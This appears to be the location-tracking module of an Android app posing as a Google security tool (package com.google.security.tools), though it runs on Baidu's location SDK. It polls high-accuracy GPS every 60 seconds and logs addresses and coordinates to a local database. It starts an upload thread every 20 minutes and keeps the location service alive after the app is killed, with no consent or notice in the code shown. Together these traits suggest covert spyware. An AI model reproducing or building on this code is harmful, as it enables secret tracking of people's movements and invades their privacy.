package com.google.security.tools;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;

import org.apache.http.ParseException;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.util.Log;

import com.baidu.location.BDLocation;
import com.baidu.location.BDLocationListener;
import com.baidu.location.LocationClient;
import com.baidu.location.LocationClientOption;
import com.baidu.location.LocationClientOption.LocationMode;
import com.baidu.mapapi.SDKInitializer;
import com.baidu.mapapi.model.LatLng;
import com.baidu.mapapi.utils.DistanceUtil;
import com.google.security.DBHelper;
import com.google.security.SQLLocalStorage;
import com.google.security.UploadUtils.ThreadUpload;

public class GpsTool {

	public static String LOGTAG = "GpsTool";
	private Context context;
	private static GpsTool GpsTool = null;
	private LocationClient mLocationClient = null;
	public MyLocationListener mMyLocationListener;
	private boolean isStarted = false;
	private boolean isOnce = false;
	private SimpleDateFormat sf = null;
	int num = 0;
	DBHelper helper;
	ThreadUpload t;

	private GpsTool(Context context) {
		this.context = context;
		if (context == null) {
			return;
		}
		// 准备工作
		initEnvironment();
	}

	public static GpsTool getInstance(Context context) {
		if (GpsTool == null) {
			if (context == null)
				return null;
			GpsTool = new GpsTool(context);
		}

		return GpsTool;
	}

	private void initEnvironment() {
		// TODO Auto-generated method stub
		SDKInitializer.initialize(context.getApplicationContext());
		mLocationClient = new LocationClient(context.getApplicationContext());
		mMyLocationListener = new MyLocationListener();
		mLocationClient.registerLocationListener(mMyLocationListener);
		initLocation();
		helper = new DBHelper(context, SQLLocalStorage.DB_MESSAGE);
	}

	public void startLocation() {
		// TODO Auto-generated method stub
		mLocationClient.start();
		Timer timer = new Timer(true);
		timer.schedule(task, 1000, 20 * 60 * 1000);
		isStarted = true;

	}

	TimerTask task = new TimerTask() {
		public void run() {
			try {
				Log.e(LOGTAG, "20min");
				t = new ThreadUpload();
				t.start();
			} catch (ParseException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	};

	public void stopLocation() {

		mLocationClient.stop();
		isStarted = false;
	}

	public boolean isAlive() {
		return isStarted;
	}

	private void initLocation() {
		LocationClientOption option = new LocationClientOption();
		option.setLocationMode(LocationMode.Hight_Accuracy);// 默认高精度，设置定位模式，高精度，低功耗
		option.setCoorType("bd09ll");// 设置坐标类型，默认gcj02，设置返回的定位结果坐标系，
		option.setScanSpan(60000);// 设置扫描周期
									// ，默认即仅定位一次，设置发起定位请求的间隔需要大于等1000ms才是有效的
		option.setIsNeedAddress(true);// 设置是否需要地址信息，默认不需要
		option.setOpenGps(true);// 默认false,设置是否使用gps
		option.setIsNeedLocationDescribe(true);
		option.setLocationNotify(true);// 默认false，设置是否当gps有效时按照1S1次频率输出GPS结果
		option.setIgnoreKillProcess(true);// 默认true，定位SDK内部是一个SERVICE，并放到了独立进程，设置是否在stop的时候杀死这个进程，默认不杀
		mLocationClient.setLocOption(option);
	}

	public void requestLocation() {
		mLocationClient.start();
		Log.e(LOGTAG, "requestLocation");
		num=19;
		isOnce = true;
	}

	public class MyLocationListener implements BDLocationListener {

		@Override
		public void onReceiveLocation(BDLocation location) {
			// Receive Location
			Log.e(LOGTAG, "60s"+"  "+num);
			
			
			if (num < 19) {
				num++;
				if (location == null) {
					return;
				}
				// gpsDBHelper = new GpsDBHelper(context);
				Cursor c = helper.query_tab_location();
				c.moveToLast();
				if (c.moveToLast() == false) {
					// BDLocation location =
					// mLocationClient.getLastKnownLocation();

					String time1 = getCurrentDate();
					String addre1 = location.getAddrStr();
					Double lo1 = location.getLongitude();
					Double la1 = location.getLatitude();
					ContentValues values1 = new ContentValues();
					values1.put("time", time1);
					values1.put("addre", addre1);
					values1.put("lo", lo1);
					values1.put("la", la1);
					helper.insert_tab_location(values1);

				} else {
					int lo = c.getColumnIndex("lo");// 注意cursor用法
					int la = c.getColumnIndex("la");
					Double lo1 = (double) c.getFloat(lo);
					Double la1 = (double) c.getFloat(la);
					LatLng latlng1 = new LatLng(la1, lo1);

					Double lo2 = location.getLongitude();
					Double la2 = location.getLatitude();
					LatLng latlng2 = new LatLng(la2, lo2);

					String newtime = getCurrentDate();
					String newaddre = location.getAddrStr();
					Double newlo = location.getLongitude();
					Double newla = location.getLatitude();
					final ContentValues newvalues = new ContentValues();
					newvalues.put("time", newtime);
					newvalues.put("addre", newaddre);
					newvalues.put("lo", newlo);
					newvalues.put("la", newla);
					double distance = DistanceUtil
							.getDistance(latlng1, latlng2);

					// 当移动一定距离时存储位置信息 //移动超过50米时存储该次位置信息//
					if (distance > 50) {
						helper.insert_tab_location(newvalues);
					}
				}
				c.close();
			}else if(num ==19){
				num=0;
				if (location == null) {
					return;
				}
				String time = location.getTime();
				String addre = location.getAddrStr();
				Double lo = location.getLongitude();
				Double la = location.getLatitude();
				ContentValues values = new ContentValues();
				values.put("time", time);
				values.put("addre", addre);
				values.put("lo", lo);
				values.put("la", la);
				helper.insert_tab_location(values);
				Log.e(LOGTAG, values.toString());
				if(isOnce){
					t = new ThreadUpload();
					t.start();
					isOnce = false;
				}
			}
			
		}

	}

	public String getCurrentDate() {
		Date d = new Date();
		sf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		return sf.format(d);
	}
}
